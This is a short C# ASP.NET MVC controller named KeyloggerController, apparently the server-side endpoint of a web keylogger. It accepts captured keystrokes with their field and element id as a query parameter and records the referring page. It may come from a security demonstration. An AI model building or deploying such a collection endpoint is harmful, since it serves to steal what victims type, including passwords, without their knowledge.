using System.Web.Mvc;

namespace Web.Controllers
{
  public class KeyloggerController : Controller
  {
    //
    // GET: /Keylogger/
    public ActionResult Index(string k)
    {
      var payload = k.Split(',');

      ViewBag.Key = payload[0];
      ViewBag.Field = payload[1];
      ViewBag.Id = payload[2];

      ViewBag.Referrer = Request.UrlReferrer;

      return View();
    }
  }
}
